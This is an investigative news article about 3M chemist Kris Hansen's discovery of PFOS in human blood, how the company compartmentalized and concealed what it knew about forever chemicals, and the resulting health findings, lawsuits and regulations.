<p data-pp-blocktype="copy" data-pp-id="23.0">When 3M was founded, in 1902, it was known as the Minnesota Mining and Manufacturing Company. After its mining operations flopped, the company pivoted to sandpaper and then to a series of clever inventions aimed at improving everyday life. An early employee noticed that autoworkers were struggling to paint two-tone cars, which were popular at the time; he eventually invented masking tape, using crêpe paper and cabinetmaker’s glue. Another 3M employee created Post-it notes to help him bookmark passages in his church hymnal. An official history of 3M, published for the company’s 100th anniversary, celebrated its “tolerance for tinkerers.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="24.0">Fluorochemicals had their origins in the American effort to build the atomic bomb. During the Second World War, scientists for the Manhattan Project developed one of the first safe processes for bonding carbon to fluorine, a dangerously reactive element that experts had nicknamed “the wildest hellcat” of chemistry. After the war, 3M hired some Manhattan Project chemists and began mass-producing chains of carbon atoms bonded to fluorine atoms. The resulting chemicals proved to be astonishingly versatile, in part because they resist oil, water and heat. They are also incredibly long-lasting, earning them the moniker “forever chemicals.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="25.0">In the early ’50s, 3M began selling one of its fluorochemicals, PFOA, to the chemical company DuPont for use in Teflon. Then, a couple of years later, a dollop of fluorochemical goo landed on a 3M employee’s tennis shoe, where it proved impervious to stains and impossible to wipe off. 3M now had the idea for Scotchgard and Scotchban. By the time Hansen was in elementary school, in the ’70s, both products were ubiquitous. Restaurants served French fries in Scotchban-treated packaging. Hansen’s mother sprayed Scotchgard on the living-­room couch.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="26.0">Hansen grew up in Lake Elmo, Minnesota, not far from 3M’s headquarters. Her father was one of the company’s star engineers and was even inducted into its hall of fame in 1979; he had helped to create Scotch-Brite scouring pads and Coban wrap, a soft alternative to sticky bandages. Once, he molded some fibers into cups, thinking that they might make a good bra. They turned out to be miserably uncomfortable, so he and his colleagues placed them over their mouths, giving the company the inspiration for its signature N95 mask.</p>

<p data-pp-blocktype="copy" data-pp-id="28.0">Hansen never intended to follow her father to the company. She spent her childhood summers catching turtles and leopard frogs at the lake and hoped to have a career in environmental conservation. Her first job after earning her chemistry Ph.D. was on a boat, which took her to remote parts of the Pacific Ocean. But the voyage left her so seasick that she lost 20 pounds, and she soon retreated to Minnesota. In 1996, at her father’s suggestion, Hansen applied for a position in 3M’s environmental lab.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="29.0">After Hansen started her PFOS research, her relationships with some colleagues seemed to deteriorate. One afternoon in 1998, a trim 3M epidemiologist named Geary Olsen arrived with several vials of blood and asked her to test them. The next morning, she read the results to him and several colleagues — positive for PFOS. As Hansen remembers it, Olsen looked triumphant. “Those samples came from my horse,” he said — and his horse certainly wasn’t eating at McDonald’s or trotting on Scotchgarded carpets. Hansen felt that he was trying to humiliate her. (Olsen did not respond to requests for comment.) What Hansen wanted to know was how PFOS was making its way into animals.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="30.0">She found an answer in data from lab rats, which also appeared to have fluorochemicals in their blood. Rats that had more fish meal in their diets, she discovered, tended to have higher levels of PFOS, suggesting that the chemical had spread through the food chain and perhaps through water. In male lab rats, PFOS levels rose with age, indicating that the chemical accumulated in the body. But, curiously, in female rats the levels sometimes fell. Hansen was unsettled when toxicology reports indicated why: Mother rats seemed to be offloading the chemical to their pups. Exposure to PFOS could begin before birth.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="31.0">Another study confirmed that Scotchban and Scotchgard were sources of the chemical. PFOS wasn’t an official ingredient in either product, but both ­contained other fluorochemicals that, the study showed, broke down into PFOS in the bodies of lab rats. Hansen and her team ultimately found PFOS in eagles, chickens, rabbits, cows, pigs and other animals. They also found 14 ­additional fluorochemicals in human blood, including several produced by 3M. Some were present in wastewater from a 3M factory.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="33.0">At one point, Hansen told her father, Paul, that she was frustrated by the way senior colleagues kept questioning her work. Paul had recently retired, but he had confidence in 3M’s top executives, and he suggested that she take her findings directly to them. But as a relatively new employee — and one of the few women scientists at a company of about 75,000 people — Hansen found the idea preposterous. When Paul offered to talk to some of 3M’s executives himself, she was mortified at the idea of her father interceding.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="34.0">Hansen knew that if she could find a blood sample that <em>didn’t</em> contain PFOS then she might be able to convince her colleagues that the other samples did. She and her team began to study historical blood from the early decades of PFOS production. They soon found the chemical in blood from a 1969-71 Michigan breast cancer study. Then they ran an overnight test on blood that had been collected in rural China during the ’80s and ’90s. If any place were PFOS-free, she figured, it would be somewhere remote, where 3M products weren’t in widespread use.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="35.0">The next morning, anxious to see the results, Hansen arrived at the lab before anyone else. For the first time since she had begun testing blood, some of the samples showed no trace of PFOS. She was so struck that she called her husband. There was nothing wrong with her equipment or methodology; PFOS, a man-made chemical produced by her employer, really <em>was</em> in human blood, practically everywhere. Hansen’s team found it in Swedish blood samples from 1957 and 1971. After that, her lab analyzed blood that had been collected before 3M created PFOS. It tested negative. Apparently, fluorochemicals had entered human blood after the company started selling products that contained them. They had leached out of 3M’s sprays, coatings and factories — and into all of us.</p>
        
    
                    
<hr>

        
    
                    
<p data-pp-blocktype="copy" data-pp-id="37.0">That summer, an in-house librarian at 3M delivered a surprising article to Hansen’s office mailbox. It had been written in 1981 by 3M scientists, and it described a method for measuring fluorine in blood, indicating that even back then the company was testing for fluorochemicals. One scientist mentioned in the article, Richard Newmark, still worked for 3M, in a low-lying structure nicknamed the “nerdy building.” Hansen arranged to meet with him there.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="38.0">Newmark, a collegial man with a compact build, told Hansen that, more than 20 years before, two academic scientists, Donald Taves and Warren Guy, had discovered a fluorochemical in human blood. They had wondered whether Scotchgard might be its source, so they approached 3M. Newmark told her that his subsequent experiments had confirmed their suspicions — the chemical was PFOS — but 3M lawyers had urged his lab not to admit it.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="39.0">As Hansen wrote all this down in a notebook, she felt anger rising inside her. Why had so many colleagues doubted the soundness of her results if earlier 3M experiments had already proved the same thing? After the meeting, she hurried back to the lab to find Bacon. “He knew!” she told him.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="40.0">Bacon’s face remained expressionless. He told Hansen to type up her notes for him. She remembers him telling her not to email them. (In response to questions about Hansen’s account, Bacon said that he didn’t remember specifics. When I called Newmark, he told me that he could not remember her or anything about PFOS. “It’s been a very long time, and I’m in my mid-80s, and just do not remember stuff that well,” he said.)</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="41.0">A few months later, in early 1999, Bacon invited Hansen to an extraordinary meeting: She would have the chance to present her findings to 3M’s CEO, Livio D. DeSimone. Hansen spent several days rehearsing while driving and making dinner. On the day of the meeting, she took an elevator up to the executive suite; her stomach turned as a secretary pointed her to a conference room. Men in suits sat around a long table. Her boss, Bacon, was there. DeSimone, a portly man with white hair, sat at the head of the table.</p>

<p data-pp-blocktype="copy" data-pp-id="43.0">Almost as soon as Hansen placed her first transparency on the projector, the attendees began interrogating her: Why did she do this research? Who directed her to do it? Whom did she inform of the results? The executives seemed to view her diligence as a betrayal: Her data could be damaging to the company. She remembers defending herself, mentioning Newmark’s similar work in the ’70s and trying, unsuccessfully, to direct the conversation back to her research. While the executives talked over her, Hansen noticed that DeSimone’s eyes had closed and that his chin was resting on his dress shirt. The CEO appeared to have fallen asleep. (DeSimone died in 2017. A company spokesperson did not answer my questions about the meeting.)</p>
        
    
                    
<hr>

        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="46.0">After that meeting, Hansen remembers learning from Bacon that her job would be changing. She would only be allowed to do experiments that a supervisor had specifically requested, and she was to share her data with only that person. She would spend most of her time analyzing samples for studies that other employees were conducting, and she should not ask questions about what the results meant. Several members of her team were also being reassigned. Bacon explained that a different scientist at 3M would lead research into PFOS going forward. Hansen felt that she was being punished and struggled not to cry.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="47.0">Even as Hansen was being sidelined, the results of her research were quietly making their way into the files of the Environmental Protection Agency. Since the ’70s, federal law has required that companies tell the EPA about any evidence indicating that a company’s products present “a substantial risk of injury to health or the environment.” In May 1998, 3M officials notified the agency, without informing Hansen, that the company had measured PFOS in blood samples from around the U.S. — a clear reference to Hansen’s work. It did not mention its animal research from the ’70s, and it said that the chemical caused “no adverse effects” at the levels the company had measured in its workers. A year later, 3M sent the EPA another letter, again without telling Hansen. This time, it informed the agency about the 14 other fluorochemicals, several of them made by 3M, that Hansen’s team had detected in human blood. The company reiterated that it did not believe that its products presented a substantial risk to human health.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="48.0">Hansen recalls that in the summer of 1999, at an annual picnic that her parents hosted for 3M scientists, she was grilling corn when one of the creators of Scotchgard, a gray-haired man in glasses, confronted her. He accused her of trying to tear down the work of her colleagues. Did it make her feel powerful ruining other people’s careers? he asked. Hansen didn’t know how to respond, and he walked away.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="49.0">Several of Hansen’s superiors had stopped greeting her in the hallways. When she presented a poster of her research at a 3M event, nobody asked her about it. She lost her appetite, and her pleated pants grew baggy. She started to worry that an angry co-worker might confront or even harm her in the company’s dark parking lot. She got into the habit of calling her husband before walking to her car.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="50.0">A year after Hansen’s meeting with the CEO, 3M, under pressure from the EPA, made a very costly decision: It was going to discontinue its entire portfolio of PFOS-­related chemicals. In May 2000, for the first time, 3M officials revealed to the press that it had detected the chemical in blood banks. One executive claimed that the discovery was a “complete surprise.” The company’s medical director <a href="https://www.nytimes.com/2000/05/19/business/epa-says-it-pressed-3m-for-action-on-scotchgard-chemical.html">told The New York Times</a>, “This isn’t a health issue now, and it won’t be a health issue.” But the newspaper also quoted a professor of toxicology. “The real issue is this stuff accumulates,” the professor said. “No chemical is totally innocuous, and it seems inconceivable that anything that accumulates would not eventually become toxic.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="51.0">Hansen was now pregnant with twins. Although she was heartened by 3M’s announcement — she saw it as evidence that her work had forced the company to act — she was also ready to leave the environmental lab, where she felt marginalized. After giving birth, she joined 3M’s medical devices team. But first, she decided to have one last blood sample tested for PFOS: her own. The results showed one of the lowest readings she’d seen in human blood. Immediately, she thought of the rats that had passed the chemical on to their pups.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="52.0">Hansen told me that, for the next 19 years, she avoided the subject of fluorochemicals with the same intensity with which she had once pursued it. She focused on raising her kids and coaching a cross-country ski team; she worked a variety of jobs at 3M, none related to fluorochemicals. In 2002, when 3M announced that it would be replacing PFOS with another fluorochemical, PFBS, Hansen knew that it, too, would remain in the environment indefinitely. Still, she decided not to involve herself. She skipped over articles about the chemicals in scientific journals and newspapers, where they were starting to be linked to possible developmental, immune system and liver problems. (In 2006, after the EPA accused 3M of violating the Toxic Substances Control Act, in part by repeatedly ­failing to disclose the harms of fluorochemicals promptly, the company agreed to pay a small penalty of $1.5 million, without admitting wrongdoing.)</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="53.0">During that time, forever chemicals gained a new scientific name — per- and polyfluoroalkyl substances, or PFAS, an acronym that is vexingly similar to the specific fluorochemical PFOS. A swath of 150 square miles around 3M’s headquarters was found to be polluted with PFAS; scientists discovered PFOS and PFBS in local fish and various fluorochemicals in water that roughly 125,000 Minnesotans drank. Hansen’s husband, Peter, told me that, when friends asked Hansen about PFAS, she would change the subject. Still, she repeatedly told him — and herself — that the chemicals were safe.</p>

<p data-pp-blocktype="copy" data-pp-id="56.0">In the 2016 book “Secrecy at Work,” two management theorists, Jana Costas and Christopher Grey, argue that there is nothing inherently wrong or harmful about keeping secrets. Trade secrets, for example, are protected by federal and state law on the grounds that they promote innovation and contribute to the economy. The authors draw on a large body of sociological research to illustrate the many ways that information can be concealed. An organization can compartmentalize a secret by slicing it into smaller components, preventing any one person from piecing together the whole. Managers who don’t want to disclose sensitive information may employ “stone-faced silence.” Secret-keepers can form a kind of tribe, dependent on one another’s continued discretion; in this way, even the existence of a secret can be kept secret. Such techniques become pernicious, Costas and Grey write, when a company keeps a dark secret, a secret about wrongdoing.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="57.0">Certain unpredictable events — a leak, a lawsuit, a news story — can start to unspool a secret. In the case of forever chemicals, the unspooling began on a cattle farm. In 1998, a West Virginia farmer told a lawyer, Robert Bilott, that wastewater from a DuPont site seemed to be poisoning his cows: They had started to foam at the mouth, their teeth grew black and more than a hundred eventually fell over and died. Bilott sued and obtained tens of thousands of internal documents, which helped push forever chemicals into the public consciousness. The documents revealed that the farm’s water contained PFOA, the fluorochemical that DuPont had bought from 3M, and that both companies had long understood it to be toxic. (The lawsuit, which ended in a settlement, was dramatized in the film “Dark Waters,” starring Mark Ruffalo as Bilott.) Bilott later sued 3M over contamination in Minnesota, but the judge prohibited discussion of health repercussions; a jury ultimately decided in 3M’s favor. Finally, in 2010, the Minnesota attorney general’s office filed its own suit, alleging that 3M had harmed the environment and polluted drinking water. The company paid $850 million in a settlement, without an admission of fault or liability. The AG also released thousands more internal 3M records to the public.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="59.0">The AG’s records helped me report <a href="https://theintercept.com/series/bad-chemistry">a series of stories for The Intercept</a> about forever chemicals. Much of my reporting, which started in 2015, focused on <a href="https://theintercept.com/2018/07/31/3m-pfas-minnesota-pfoa-pfos/">what 3M and DuPont knew</a>, even as they continued to produce PFAS. But, as I reported on the cover-up, I wondered what it meant for a sprawling multinational company to <em>know</em> that its products were dangerous. Who knew? How much, exactly, did they know? And how had the company kept its secret? For many years, no one inside 3M would agree to speak with me.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="60.0">Then, in 2021, John Oliver did a segment on his comedy news show, “Last Week Tonight,” about forever chemicals. The segment, which mentioned my reporting, said that they could cause cancer, immune-system issues and other problems. “The world is basically soaked in the Devil’s piss right now,” Oliver said. “And not in a remotely hot way.” One of Hansen’s former professors sent her the segment, and Hansen watched it at her kitchen table — a moment that would eventually lead her to me.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="61.0">“This actually made me sad as there are so many inaccuracies,” Hansen wrote to her professor in response. But, when the professor asked her what was incorrect, Hansen didn’t know what to say. For the first time, she Googled the health effects of PFOS.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="62.0">Hansen was deeply troubled by what she read. One paper, published in 2012 in the Journal of the American Medical Association, found that, in children, as PFOS levels rose so did the chance that vaccines were ineffective. Children with high levels of PFOS and other fluorochemicals were more likely to experience fevers, according to a 2016 study. Other research linked the chemicals to increased rates of infectious diseases, food allergies and asthma in children. Dozens of scientific papers had found that, in adults, even very low levels of PFOS could interfere with hormones, fertility, liver and thyroid function, cholesterol levels and fetal development. Even PFBS, the chemical that 3M chose as a replacement for PFOS, caused developmental and reproductive irregularities in animals, according to the Minnesota Department of Health.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="63.0">Reading these studies, Hansen felt a paradoxical kind of relief: As bad as PFOS seemed to be, at least independent scientists were studying it. But she also felt enraged at the company and at herself. For years, she had repeated the company’s claim that PFOS was not harmful. “I’m not proud of that,” she told me. She felt “dirty” for ever collecting a 3M paycheck. When she read the documents released by the Minnesota AG, she was horrified by how much the company had known and how little it had told her. She found records of studies that she had conducted, as well as the typed notes from her meeting with Newmark.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="64.0">In October 2022, after Hansen had been at 3M for 26 years, her job was eliminated, and she chose not to apply for a new one. Three months later, she wrote me an email, offering to speak about what she had witnessed inside the company. “If you’d be interested in talking further, please let me know,” she wrote. The next day, we had the first of dozens of conversations.</p>
        
    
                    
<hr>

        
    
                    
<p data-pp-blocktype="copy" data-pp-id="66.0">When Hansen first told me about her experiences, I felt conflicted. Her work seemed to have helped force 3M to stop making a number of toxic chemicals, but I kept thinking about the 20 years in which she had kept quiet. During my first visit to Hansen’s home, in February 2023, we sat in her kitchen, eating bread that her husband had just baked. She showed me pictures of her father and shared a color-coded timeline of 3M’s history with forever chemicals. On a bitterly cold walk in a local park, we tried to figure out if any of her colleagues, besides Newmark, had known that PFOS was in everyone’s blood. She often sprinkled her stories with such Midwesternisms as “holy ­buckets!”</p>

<p data-pp-blocktype="copy" data-pp-id="68.0">During my second trip, this past August, I asked her why, as a scientist who was trained to ask questions, she hadn’t been more skeptical of claims that PFOS was harmless. In the awkward silence that followed, I looked out the window at some hummingbirds.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="69.0">Hansen’s superiors had given her the same explanation that they gave journalists, she finally said — that factory workers were fine, so people with lower levels would be, too. Her specialty was the detection of chemicals, not their harms. “You’ve got literally the medical director of 3M saying, ‘We studied this, there are no effects,’” she told me. “I wasn’t about to challenge that.” Her income had helped to support a family of five. Perhaps, I wondered aloud, she hadn’t really wanted to know whether her company was poisoning the public.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="70.0">To my surprise, Hansen readily agreed. “It almost would have been too much to bear at the time,” she told me. 3M had successfully compartmentalized its secret; Hansen had only seen one slice. (When I sent the company detailed questions about Hansen’s account, a spokesperson responded without answering most of them or mentioning Hansen by name.)</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="72.0">Recently, I thought back on Taves and Guy, the academic scientists who, in the ’70s, came so close to proving that 3M’s chemicals were accumulating in humans. Taves is 97, but when I called him he told me that he still remembers clearly when company representatives visited his lab at the University of Rochester. “They wanted to know everything about what we were doing,” he told me. But the exchange was not reciprocal. “I soon found out that they weren’t going to tell me anything.” 3M never confirmed to Taves or Guy, who was a postdoctoral student at the time, that its fluorochemicals were in human blood. “I’m sort of kicking myself for not having followed up on this more, but I didn’t have any research money,” Guy told me. He eventually became a dentist to support his wife and family. (He died this year at 81.) Taves, too, left the field, to become a psychiatrist, and the trail ended there.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="73.0">Last year, while reading about the thousands of PFAS-related lawsuits that 3M was facing, I was intrigued to learn that one of them, filed by cities and towns with polluted water, had produced a new set of internal 3M documents. When I requested several from the plaintiff’s legal team, I saw two names that I recognized. In a document from 1991, a 3M scientist talked about using a mass spectrometer — the same tool that Hansen would use years later — to devise a technique for measuring PFOS in biological fluid. The author was Jim Johnson — and he had sent the report to his boss, Dale Bacon.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="74.0">This revelation made me gasp. Johnson had been Hansen’s first boss and had instigated her research into PFOS. Bacon had questioned her findings and ultimately told her to stop her work. (In a sworn deposition, Bacon said that by the ’80s he had heard, during a water-cooler chat with a colleague, that Taves and Guy had found PFOS in human blood.) What I couldn’t understand was why Johnson would ask Hansen to investigate something that he had already studied himself — and then act surprised by the results.</p>

<p data-pp-blocktype="copy" data-pp-id="76.0">Jim Johnson, who is now an 81-year-old widower, lives with several dogs in a pale-yellow house in North Dakota. When I first called him, he said that he had begun researching PFOS in the ’70s. “I did a lot of the very original work on it,” he told me. He said that when he saw the chemical’s structure he understood “within 20 minutes” that it would not break down in nature. Shortly thereafter, one of his experiments revealed that PFOS was binding to proteins in the body, causing the chemical to accumulate over time. He told me that he also looked for PFOS in an informal test of blood from the general population, around the late ’70s, and was not surprised when he found it there.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="77.0">Johnson initially cited “480 pounds of dog” as a reason that I shouldn’t visit him, but he later relented. When I arrived, on a chilly day in November, we spent a few minutes standing outside his house, watching Snozzle, Sadie and Junkyard press their slobbery snouts against his living ­room window. Then we decamped to the nearest IHOP. Johnson, who was dressed in jeans and a flannel shirt, was so tall that he couldn’t comfortably fit into a booth. We sat at a table and ordered two bottomless coffees.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="78.0">In an experiment in the early ’80s, Johnson fed a component of Scotchban to rats and found that PFOS accumulated in their livers, a result that suggested how the chemical would behave in humans. When I asked why that mattered to the company, he took a sip of coffee and said, “It meant they were screwed.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="79.0">At the time, Johnson said, he didn’t think PFOS caused significant health problems. Still, he told me, “it was obviously bad,” because man-made compounds from household products didn’t belong in the human body. He said that he argued against using fluorochemicals in toothpaste and diapers. Contrac­tors working for 3M had shaved rabbits, he said, and smeared them with the company’s fluorochemicals to see if PFOS showed up in their bodies. “They’d send me the livers and, yup, there it was,” he told me. “I killed a lot of rabbits.” But he considered his efforts largely futile. “These idiots were already putting it in food packaging,” he said.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="80.0">Johnson told me, with seeming pride, that one reason he didn’t do more was that he was a “loyal soldier,” committed to protecting 3M from liability. Some of his assignments had come directly from company lawyers, he added, and he couldn’t discuss them with me. “I didn’t even report it to my boss, or anybody,” he said. “There are some things you take to your grave.” At one point, he also told me that, if he were asked to testify in a PFOS-related lawsuit, he would probably be of little help. “I’m an old man, and so I think they would find that I got extremely forgetful all of a sudden,” he said, and chuckled.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="81.0">Out the windows of IHOP, I watched a light dusting of snow fall on the parking lot. In Johnson’s telling, a tacit rule prevailed at 3M: Not all questions needed to be asked, or answered. His realization that PFOS was in the general public’s blood “wasn’t something anyone cared to hear,” he said. He wasn’t, for instance, putting his research on posters and expecting a warm reception. Over the years, he tried to convince several executives to stop making PFOS altogether, he told me, but they had good reason not to. “These people were selling fluorochemicals,” he said. He retired as the second-highest-­ranked scientist in his division, but he claimed that important business decisions were out of his control. “It wasn’t for me to jump up and start saying, ‘This is bullshit!’” he said, and he was “not really too interested in getting my butt fired.” And so his portion of 3M’s secret stayed in a compartment, both known and not known.</p>

<p data-pp-blocktype="copy" data-pp-id="83.0">Johnson said that he eventually tired of arguing with the few colleagues with whom he could speak openly about PFOS. “It was time,” he said. So he hired an outside lab to look for the chemical in the blood of 3M workers, knowing that it would also test blood bank samples for comparison — the first domino in a chain that would ultimately take the compound off the market. Oddly, he compared the head of the lab to a vending machine. “He gave me what I paid for,” Johnson said. “I knew what would happen.” Then Johnson tasked Hansen with something that he had long avoided: going beyond his initial experiments and meticulously documenting the chemical’s ubiquity. While Hansen took the heat, he took early retirement.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="85.0">Johnson described Hansen as though she were a vending machine, too. “She did what she was supposed to do with the tools I left her,” he said.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="86.0">I pointed out that Hansen had suffered professionally and personally, and that she now feels those experiences tainted her career. “I didn’t say I was a nice guy,” Johnson replied, and laughed. After four hours, we were nearing the bottom of our bottomless coffees.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="87.0">Johnson has strayed from evidence-­based science in recent years. He now believes, for instance, that the theory of evolution is wrong, and that COVID-19 vaccines cause “turbo-cancers.” But his account of what happened at 3M closely matched Hansen’s, and when I asked him about meetings and experiments described in court documents he remembered them clearly.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="88.0">When I called Hansen about my conversation with Johnson, she grew angrier than I’d ever heard her. “He knew the whole time!” she said. Then she had to get off the phone for an appointment. “So glad I’m going to see my therapist,” she added, and hung up.</p>

<p data-pp-blocktype="copy" data-pp-id="90.0">I once thought of secrets as discrete, explosive truths that a heroic person could suddenly reveal. In the 1983 film “Silkwood,” which is based on real events, Karen Silkwood, a worker at a plutonium plant, assembles a thick folder documenting her employer’s shoddy safety practices; while driving to share them with a reporter, she dies in a mysterious one-car crash. In another adaptation of a true story, the 2015 film “Spotlight,” a source delivers a box of critical documents to The Boston Globe, helping the paper to publish an investigation into child sexual abuse within the Catholic Church. Talking to Hansen and Johnson, though, I saw that the truth can come out piecemeal over many years, and that the same people who keep secrets can help divulge them. Some slices of 3M’s secret are only now coming to light, and others may never come out.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="91.0">Between 1951 and 2000, 3M produced at least 100 million pounds of PFOS and chemicals that degrade into PFOS. This is roughly the weight of the Titanic. After the late ’70s, when 3M scientists established that the chemical was toxic in animals and was accumulating in humans, it produced millions of pounds per year. Scientists are still struggling to grasp all the biological consequences. They have learned, just as Johnson did decades ago, that proteins in the body bind to PFOS. It enters our cells and organs, where even tiny amounts can cause stress and interfere with basic biological functions. It contributes to diseases that take many years to develop; at the time of a diagnosis, one’s PFOS level may have fallen, making it difficult to establish causation with any certainty.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="92.0">The other day, I called Brad Creacey, who became an Air Force firefighter in the ’70s at the age of 18. He told me that several times a year, for practice, he and his comrades put on rubber boots and heavy silver uniforms that looked like spacesuits. Then a “torch man,” holding a stick tipped with a burning rag, ignited jet fuel that had been poured into an open-air pit. To extinguish the 100-foot-tall flames, Creacey and his colleagues sprayed them with aqueous film-forming foam, or AFFF. 3M manufactured it from several forever chemicals, including PFOS.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="93.0">Creacey remembers that AFFF felt slick and sudsy, almost like soap, and dried out the skin on his hands until it cracked. To celebrate his last day on a military base in Germany, his friends dumped a ceremonial bucket on him. Only later, after working with firefighting foam at an airport in Monterey, California, did he start to wonder if a string of ailments — cysts on his liver, a nodule near his thyroid — were connected to the foam. He had high cholesterol, which diet and exercise were unable to change. Then he was diagnosed with thyroid cancer. “It makes me feel like I was a lab rat, like we were all disposable,” Creacey told me. “I’ve lost faith in human beings.”</p>

        <span>To celebrate Air Force firefighter Brad Creacey’s last day on a military base in Germany, his friends doused him with a bucket of the same aqueous film-forming foam they used to extinguish fires. Later, Creacey wondered if a string of ailments was connected to his many years of contact with the foam.</span>

<p data-pp-blocktype="copy" data-pp-id="95.0">It may be tempting to think of Creacey and his peers as unwitting research subjects; indeed, recent studies show that PFOS is associated with an increased risk of thyroid cancer and, in Air Force servicemen, an elevated risk of testicular cancer. But it is probably more accurate to say that we are all part of the experiment. Average levels of PFOS are falling, but nearly all people have at least one forever chemical in their blood, according to the Centers for Disease Control and Prevention. “When you have a contaminated site, you can clean it up,” Elsie Sunderland, an environmental chemist at Harvard University, told me. “When you ubiquitously introduce a toxicant at a global scale, so that it’s detectable in everyone ... we’re reducing public health on an incredibly large scale.” Once everyone’s blood is contaminated, there is no control group with which to compare, making it difficult to establish responsibility.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="96.0">New health effects continue to be discovered. Researchers have found that exposure to PFAS during pregnancy can lead to developmental delays in children. Numerous recent studies have linked the chemicals to diabetes and obesity. This year, a study discovered 13 forever chemicals, including PFOS, in weeks-old fetuses from terminated pregnancies and linked the chemicals to biomarkers associated with liver problems. A team of New York University researchers estimated in 2018 that the costs of just two forever chemicals, PFOA and PFOS — in terms of disease burden, disability and health-care expenses — amounted to as much as $62 billion in a single year. This exceeds the current market value of 3M.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="98.0">Philippe Grandjean, a physician who helped discover that PFAS harm the immune system, believes that anyone exposed to these chemicals — essentially everyone — may have an elevated risk of cancer. Our immune systems often find and kill abnormal cells before they turn into tumors. “PFAS interfere with the immune system, and likely also this critical function,” he told me. Grandjean, who served as an expert witness in the Minnesota AG’s case, has studied many environmental contaminants, including mercury. The impact of PFAS was so much more extreme, he said, that one of his colleagues initially thought it was the result of nuclear radiation.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="99.0">In April, the EPA took two historic steps to reduce exposure to PFAS. It said that PFOS and PFOA are “likely to cause cancer” and that no level of either chemical is considered safe; it deemed them hazardous substances under the Superfund law, increasing the government’s power to force polluters to clean them up. The agency also set limits for six PFAS in drinking water. In a few years, when the EPA begins enforcing the new regulations, local utilities will be required to test their water and remove any amount of PFOS or PFOA which exceeds four parts per trillion — the equivalent of one drop dissolved in several Olympic swimming pools. 3M has produced enough PFOS and chemicals that degrade into PFOS to exceed this level in all of the freshwater on earth. Meanwhile, many other PFAS continue to be used, and companies are still developing new ones. Thousands of the compounds have been produced; the Department of Defense still depends on many for use in explosives, semiconductors, cleaning fluids and batteries. PFAS can be found in nonstick cookware, guitar strings, dental floss, makeup, hand sanitizer, brake fluid, ski wax, fishing lines and countless other products.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="100.0">In a statement, a 3M spokesperson told me that the company “is proactively managing PFAS,” and that 3M’s approach to the chemicals has evolved along with “the science and technology of PFAS, societal and regulatory expectations, and our expectations of ourselves.” He directed me to a fact sheet about their continued importance in society. “These substances are critical to multiple industries — including the cars we drive, planes we fly, computers and smart phones we use to stay connected, and more,” the fact sheet read.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="101.0">Recently, 3M settled the lawsuit filed by cities and towns with polluted water. It will pay up to $12.5 billion to cover the costs of filtering out PFAS, depending on how many water systems need the chemicals removed. The settlement, however, doesn’t approach the scale of the problem. At least 45% of U.S. tap water is estimated to contain one or more forever chemicals, and one drinking water expert told me that the cost of removing them all would likely reach $100 billion.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="102.0">In 2022, 3M said that it would stop making PFAS and would “work to discontinue the use of PFAS across its product portfolio,” by the end of 2025 — a pledge that it called “another example of how we are positioning 3M for continued sustainable growth.” But it acknowledged that more than 16,000 of its products still contained PFAS. Direct sales of the chemicals were generating $1.3 billion annually. 3M’s regulatory filings also allow for the possibility that a full phaseout won’t happen — for example, if 3M fails to find substitutes. “We are continuing to make progress on our announcement to exit PFAS manufacturing,” 3M’s spokesperson told me. The company and its scientists have not admitted wrong­doing or faced criminal liability for producing forever chemicals or for concealing their harms.</p>

